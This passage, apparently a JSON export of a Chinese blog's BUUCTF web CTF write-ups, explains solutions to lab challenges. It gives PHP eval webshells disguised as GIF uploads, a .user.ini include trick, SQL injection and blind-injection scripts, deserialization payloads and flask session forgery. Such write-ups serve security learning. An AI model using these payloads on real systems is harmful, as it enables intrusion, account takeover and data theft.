?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#roarctf-2019easy-calc"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]Http 查看源码在\"氛围\"这两个字上有隐藏的跳转Secret.php。进入以后页面显示 text It doesn't come from 'https://www.Sycsecret.com'\r提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示 text Please use \"Syclover\" browser\r加上User-Agent。提示 text No!!! you can only read this locally!!!\r加上X-Forwarded-For。HTTP X-Forwarded-For 介绍 最终的请求头： text GET /Secret.php HTTP/1.1 Host: node3.buuoj.cn:26715 Upgrade-Insecure-Requests: 1 User-Agent: Syclover Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 x-forwarded-for: 127.0.0.1 referer: https://www.Sycsecret.com Connection: close\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019http"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]PHP 源码备份在www.zip中。下载以后有五个文件 class.php flag.php index.js index.php style.css 在index.php中有一段代码 text \u003c?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?\u003e\r再结合又一个class.php，所以这道题考点应该是反序列化。 class.php text \u003c?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-\u003eusername = $username; $this-\u003epassword = $password; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if ($this-\u003epassword != 100) { echo \"\u003c/br\u003eNO!!!hacker!!!\u003c/br\u003e\"; echo \"You name is: \"; echo $this-\u003eusername;echo \"\u003c/br\u003e\"; echo \"You password is: \"; echo $this-\u003epassword;echo \"\u003c/br\u003e\"; die(); } if ($this-\u003eusername === 'admin') { global $flag; echo $flag; }else{ echo \"\u003c/br\u003ehello my friend~~\u003c/br\u003esorry i can't give you the flag!\"; die(); } } } ?\u003e\r获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解CVE-2016-7124漏洞复现 我使用的构造对象 text \u003c?php class Name{ private $username ='admin'; private $password ='100'; } $a = new Name; echo serialize($a); O:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\r反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload text ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019php"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]Upload 先尝试上传一个gif图片马内容为 text GIF89a \u003c?php @eval($_POST['a']);\r页面提示过滤： NO! HACKER! your file included ‘\u003c?’ 尝试script执行php代码 text \u003cscript language=\"php\"\u003eeval($_POST['cmd'])\u003c/script\u003e\r可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019upload"},{"categories":["CTF"],"content":"\r2021.01.28","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210128"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]BabySQL 尝试万能密码，发现报错了：1=1#’ and password=‘123’，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有information这个词，其中的for也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。 爆数据库（填密码）： text 1' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #\r爆表： text 1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name='b4bsql' #\r爆字段值： text 1' uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019babysql"},{"categories":["CTF"],"content":"\r[ACTF2020 新生赛]Upload 指针放在灯泡上护显示上传文件的，图片马 233.gif text GIF89a \u003c?php @eval($_POST['a']);\r尝试phtml是否被过滤，直接上传成功。蚁剑连接 text ------WebKitFormBoundaryUMSByAQmR2cduL6R Content-Disposition: form-data; name=\"upload_file\"; filename=\"233.phtml\" Content-Type: image/gif GIF89a \u003c?php @eval($_POST['a']); ------WebKitFormBoundaryUMSByAQmR2cduL6R Content-Disposition: form-data; name=\"submit\" upload ------WebKitFormBoundaryUMSByAQmR2cduL6R--\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛upload"},{"categories":["CTF"],"content":"\r[ACTF2020 新生赛]BackupFile\rtext Try to find out source file!\r题目提示备份文件，备份文件常见后缀： .git .svn .swp .~ .bak .bash_history 尝试index.php.bak，下载了一个备份文件： text \u003c?php include_once \"flag.php\"; if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(\"Just num!\"); } $key = intval($key); $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"; if($key == $str) { echo $flag; } } else { echo \"Try to find out source file!\"; }\r传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的==和===的区别。贴一段简单代码 text \u003c?php $str = 'abc'; if(0==$str){ echo \"真\"; }else{ echo \"假\"; }\r==在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。 全等于===操作过程如下： 操作符两边的数据类型如果不相同，返回false 。 操作符两边的值如果不相同，返回false 。 最后将上面2步的操作进行与操作。返回与操作的结果。 所以最终的payload： text ?key=123\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛backupfile"},{"categories":["CTF"],"content":"\r[HCTF 2018]admin 可以在注释里找到 思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。 post。发表文章，但是没能找到在哪里打开 change password。改密码，尝试下能不能抓包改到admin的密码 修改密码抓到的包： 感觉并没有什么下手的地方，唯一的就是session可能和身份有关。 以下的是看网上的wp 在change password页面查看源码，发现提供了题目的源码地址 html \u003c!-- https://github.com/woadsl1234/hctf_flask/ --\u003e\r网站使用的是flask框架，具体路由表如下 python @app.route('/code') #二维码 def get_code(): @app.route('/index') #首页 def index(): @app.route('/register', methods = ['GET', 'POST']) #注册 def register(): @app.route('/login', methods = ['GET', 'POST']) #登陆 def login(): @app.route('/logout') #登出 def logout(): @app.route('/change', methods = ['GET', 'POST']) #修改密码 def change(): @app.route('/edit', methods = ['GET', 'POST']) #编辑信息 def edit():\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#hctf-2018admin"},{"categories":["CTF"],"content":"\r解法一：flask session伪造这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。 贴两篇相关文章： Python Web之flask session\u0026格式化字符串漏洞 客户端 session 导致的安全问题 首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。 说明一下flask的session值加密格式是：SECRET_KEY +一个用户对象的字符串(就像PHP里的序列化后)。SECRET_KEY的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行 text SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\r可以得知SECRET_KEY值为ckj123。然后在index.html页面发现只要session[‘name’] == ‘admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。 如下 P师傅 的程序解密： python #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload) if __name__ == '__main__': print(decryption(sys.argv[1].encode()))\r执行命令 text python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA\r结果 text {'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'guobang', 'user_id': '10'}\r然后我们需要吧name的值修改为admin。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：flask-session-cookie-manager 这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号\"\"括起来 python flask_session_cookie_manager{2,3}.py {encode,decode} -s “SECRET_KEY” 都需要使用 -c “Session cookie value” session的值 只有解密decode用得到 -t “Session cookie structure” cookie结构 只有encode用得 执行 text python flask_session_cookie_manager3.py encode -s \"ckj123\" -t \"{'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'admin', 'user_id': '10'}\"\r得到 text .eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg\r放在请求头中，格式为 text cookie: session=加密内容\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:1:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#解法一flask-session伪造"},{"categories":["CTF"],"content":"\r解法二：Unicode欺骗第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为 ᴬᴰᴹᴵᴺ——注册后——\u003eADMIN—修改密码—\u003eadmin payload text ᴬᴰᴹᴵᴺ\r注册以后使用ᴬᴰᴹᴵᴺ登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:2:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#解法二unicode欺骗"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]BuyFlag网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示 Only Cuit’s students can buy the FLAG 应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php text \u003c!-- ~~~post money and password~~~ if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo \"password can't be number\u003c/br\u003e\"; }elseif ($password == 404) { echo \"Password Right!\u003c/br\u003e\"; } }\r还记得php==关系运算会强制转换类型，用POST传一个password=404a，404a会被强制转换为404，密码就对上了。接下来是钱的问题，flag需要100000000块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，10e10，就是10的10次方，通过。最终的请求： text POST /pay.php HTTP/1.1 Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn Content-Length: 25 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: user=1 Connection: close password=404a\u0026money=10e10\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019buyflag"},{"categories":["CTF"],"content":"\r[SUCTF 2019]CheckIn 知识点 .user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache. 准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装： text GIF89a auto_prepend_file=233.gif\r接下来上传图片马，尝试了正常上传PHP马会提示： \u003c? in contents! 所以使用script马执行php： text GIF89a \u003cscript language=\"php\"\u003eeval($_REQUEST[shell])\u003c/script\u003e\r上传成功后会提示文件路径： Your dir uploads/852aff287f54bca0ed7757a702913e50 Your files : array(5) { [0]=\u003e string(1) “.” [1]=\u003e string(2) “..” [2]=\u003e string(9) “.user.ini” [3]=\u003e string(7) “233.gif” [4]=\u003e string(9) “index.php” } 这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(‘cat /flag’)。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#suctf-2019checkin"},{"categories":["CTF"],"content":"\r[BJDCTF2020]Easy MD5 参考： 【Jarvis OJ】Login–password=’\".md5($pass,true).\" sql注入：md5($password,true) Leet More 2010 Oh Those Admins! writeup 随便输入一些东西都没有反应，在请求头中发现了一个Hint： select * from ‘admin’ where password=md5($pass,true) 语法 md5(string,raw) 参数 描述 string 必需。要计算的字符串。 raw 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 概括理解，这里如果raw参数为true的话，这个函数的返回值是string的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是ffifdyop，我们来对它进行一波操作 源字符串：ffifdyop md5加密值：276f722736c95d99e921722cf9ed621c hex解码：‘or'6É].é!r,ùíb. 最后那几个应该是不可见字符，重要的是前面一段：'or'6，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个'单引号。执行以后真正的sql语句为 text select * from 'admin' where password=''or'6É].é!r,ùíb.‘\r可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段： a string starting with a 1 is cast as an integer when used as a boolean. 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。 自己进行的测试： 所以真正的解法是只要sql语句的格式为password=‘xxxxxxxx’ or ‘1xxxx’，即hex包含字符串\"276f722731\"（‘or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。 下面这个程序是这道题开头参考列表中的第三个链接。 text \u003c?php for ($i = 0;;) { for ($c = 0; $c \u003c 1000000; $c++, $i++) if (stripos(md5($i, true), '\\'or\\'') !== false) echo \"\\nmd5($i) = \" . md5($i, true) . \"\\n\"; echo \".\"; } ?\u003e\r这个程序遍历数字进行md5加密，使用stripos匹配是否有'or'，这个函数有一个弊病就是如果是以'or'开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由\\'or\\'改为'or'([1-9]+|0+[1-9]) 不过我的方法自己还没跑出来🤣，回头加个多线程试一试 （更新） 自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿： text 找到了md5(2413633098): 找到了md5(5207660362): 找到了md5(8351555222): 找到了md5(13095770027): 找到了md5(14860117901): 找到了md5(15724086109): 找到了md5(16529176061): 找到了md5(17428338265): 找到了md5(18717303578): 找到了md5(19342380396): 找到了md5(23960028257): 找到了md5(32561902614): 找到了md5(38983153698): 找到了md5(39742292223): 找到了md5(44120894060): 找到了md5(44820604888): 找到了md5(45570673322): 找到了md5(45855250502): 找到了md5(53660569009): 找到了md5(55098175010): 找到了md5(59763304323): 找到了md5(60185044906): 找到了md5(68625783421): 找到了md5(70949326264): (md5值删了，因为乱码会影响博客的搜索功能)\r程序源码如下（自己写着玩，轻喷）： text # codeing = utf-8 import threading import hashlib import re import itertools import time # r'\\'or\\'([1-9]+|0+[1-9])' # r'\\'or\\'' pattern=re.compile(r'\\'or\\'([1-9]+|0+[1-9])',re.I) item = itertools.count(1) def thrfunc(): while 1: s2 = '' temp = str(next(item)) s1 = hashlib.md5(temp.encode(encoding='UTF-8')).hexdigest() for i in range(0, len(s1), 2): s2 = s2 + chr(int(s1[i:i + 2], 16)) if re.search(pattern, s2): print(\"找到了md5(\" + temp + \"): \" + s2) threads=[] for i in range(10): t = threading.Thread(target=thrfunc) threads.append(t) t.start()\r虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。 还有一个能用的md5值： text content: 129581926211651571912466741651878684928 hex: 06da5430449f8f6f23dfc1276f722738 raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8 string: T0Do#'or'8\r以上是第一层。其实看了源码里只验证了字符串是否等于ffifdyop我写的脚本里的值肯定通过不了 第二层可以直接在源码中看到注释。 text $a = $GET['a']; $b = $_GET['b']; if($a != $b \u0026\u0026 md5($a) == md5($b)){ // wow, glzjin wants a girl friend.\r简单的md5以0E开头 text a=QNKCDZO\u0026b=240610708\r第三层 text \u003c?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag; }\r这一有一些不同的是md5比较使用了===不仅比较类型还比较值。但是md5有一个： text md5([1,2,3]) == md5([4,5,6]) == NULL\r所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。 text param1[]=1\u0026param2[]=2\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020easy-md5"},{"categories":["CTF"],"content":"\r[ZJCTF 2019]NiZhuanSiWei源码 text \u003c?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)\u0026\u0026(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"\u003cbr\u003e\u003ch1\u003e\".file_get_contents($text,'r').\"\u003c/h1\u003e\u003c/br\u003e\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u003e\r先来一段PHP伪协议总结，这题的第一步是判断传入text参数并读取内容，判断内容为welcome to the zjctf，使用data://伪协议。 text ?text=data://text/plain,welcome to the zjctf\r接下来是文件包含，有了提示useless.php肯定要读一读看看，使用php://filter伪协议。 text ?text=data://text/plain,welcome to the zjctf\u0026file=php://filter/convert.base64-encode/resource=useless.php\r得到的内容 text \u003c?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u003efile)){ echo file_get_contents($this-\u003efile); echo \"\u003cbr\u003e\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?\u003e 并且文件包含下面有一个反序列化，又看到了__tostring函数，当一个对象被当作字符串对待的时候，会触发这个魔术方法。我构造的对象 text \u003c?php class Flag{ public $file=\"flag.php\"; } $f = new Flag(); echo serialize($f); //O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\r在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload text ?text=data://text/plain,welcome to the zjctf\u0026file=useless.php\u0026password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#zjctf-2019nizhuansiwei"},{"categories":["CTF"],"content":"\r[CISCN2019 华北赛区 Day2 Web1]Hack World 很明显的sql注入，随便尝试一些语句有 1 » Hello, glzjin wants a girlfriend. 2 » Do you want to be my girlfriend? 3之后都是 » Error Occured When Fetch Result. 输入一个单引号1'出现了bool(false)，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。 题目中也有提示 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#ciscn2019-华北赛区-day2-web1hack-world"},{"categories":["CTF"],"content":"\rAll You Want Is In Table ‘flag’ and the column is ‘flag’ 说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用substr函数每次截取一个字符，获得其ascii值再使用二分法确定具体的值，最后拼接输出。 python import requests import time url = 'http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/' result = '' for x in range(1, 50): high = 127 low = 32 mid = (low + high) // 2 while high\u003elow: payload = \"if(ascii(substr((select flag from flag),%d,1))\u003e%d,1,2)\" % (x, mid) data = { \"id\":payload } time.sleep(0.3) response = requests.post(url, data = data) if 'Hello' in response.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) #flag{929c8993-2d85-4fbf-8e48-7c457551105e}\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:1","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#all-you-want-is-in-table-flag-and-the-column-is-flag"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]HardSQL 还是sql注入题。尝试在输入框里输入#、--+时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的十种MySQL报错注入。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用()隔开，具体payload如下： 爆表 sql ?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23\u0026password=1\r当前表名是：H4rDsq1 爆字段 sql ?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e)))%23\u0026password=1\r当前表的字段有：id,username,password 出数据 如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用left和right函数： 语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH) 这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下 sql ?username=admin%27or(extractvalue(1,concat(0x7e,(select(left(password,35))from(H4rDsq1)),0x7e)))%23\u0026password=1\rflag{112bb5db-17a4-47e2-97b4-19 sql ?username=admin%27or(extractvalue(1,concat(0x7e,(select(right(password,11))from(H4rDsq1)),0x7e)))%23\u0026password=1\rdc295a017f} ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019hardsql"},{"categories":["CTF"],"content":"\r[网鼎杯 2018]Fakebook 是一个展示自己博客网址的列表，先随便注册一个 我填的是baidu的网址23333。这时的url是： url http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1\r看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[网鼎杯2018]fakebook题解，使用了load_file函数直接读取了flag文件。同样是空格被过滤，但是可以使用/**/绕过。 